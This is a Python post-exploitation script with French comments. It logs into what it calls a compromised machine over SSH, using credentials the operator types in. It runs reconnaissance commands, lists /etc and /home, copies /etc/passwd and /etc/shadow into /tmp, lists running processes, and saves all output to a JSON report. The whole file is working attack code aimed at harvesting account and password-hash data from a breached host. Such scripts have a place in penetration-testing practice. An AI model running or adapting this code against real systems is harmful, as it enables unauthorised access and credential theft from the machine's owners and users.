import paramiko
import time
import json
import os

# Paramètres de connexion SSH
print("\n")
ssh_host = input("\n\033[93m Adresse IP de la machine compromise : ")
print("\n")
ssh_username = input("\n\033[93m Nom d'utilisateur SSH : ")
print("\n")
ssh_password = input("\n\033[93m Mot de passe SSH : ")
print("\n")
ssh_port = 22  # Port SSH


# Fonction pour exécuter une commande à distance via SSH
def execute_command_ssh(command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    result = {"command": command, "output": "", "error": ""}
    try:
        client.connect(ssh_host, port=ssh_port, username=ssh_username, password=ssh_password, timeout=5)
        stdin, stdout, stderr = client.exec_command(command)
        result["output"] = stdout.read().decode('utf-8')
        result["error"] = stderr.read().decode('utf-8')
        if result["output"]:
            print("[*] Output:")
            print(result["output"])
        if result["error"]:
            print("[!] Error:")
            print(result["error"])
    except Exception as e:
        result["error"] = str(e)
        print("[!] Exception:", e)
    finally:
        client.close()
    return result


# Collecte d'informations
def collect_information():
    print("[*] Collecting Information...")
    results = []
    results.append(execute_command_ssh('whoami'))
    results.append(execute_command_ssh('hostname'))
    results.append(execute_command_ssh('uname -a'))
    results.append(execute_command_ssh('cat /etc/passwd | grep -v nologin'))
    return results


# Recherche de fichiers sensibles
def search_sensitive_files():
    print("[*] Searching for Sensitive Files...")
    results = []
    results.append(execute_command_ssh('ls -la /etc/'))
    results.append(execute_command_ssh('ls -la /home/'))
    return results


# Récupération de fichiers
def retrieve_files():
    print("[*] Retrieving Files...")
    results = []
    results.append(execute_command_ssh('cat /etc/passwd > /tmp/passwd.txt'))
    results.append(execute_command_ssh('cat /etc/shadow > /tmp/shadow.txt'))
    return results


# Surveillance des processus en cours d'exécution
def monitor_processes():
    print("[*] Monitoring Processes...")
    return [execute_command_ssh('ps aux')]


# Enregistrer les résultats dans un fichier JSON
def save_results(data, filename):
    if not os.path.exists('report'):
        os.makedirs('report')

    with open(filename, 'a') as file:
        for entry in data:
            file.write(json.dumps(entry) + "\n")


# Exécution des étapes de post-exploitation
if __name__ == "__main__":
    all_results = []
    all_results.extend(collect_information())
    all_results.extend(search_sensitive_files())
    all_results.extend(retrieve_files())
    all_results.extend(monitor_processes())

    save_results(all_results, 'report/post.json')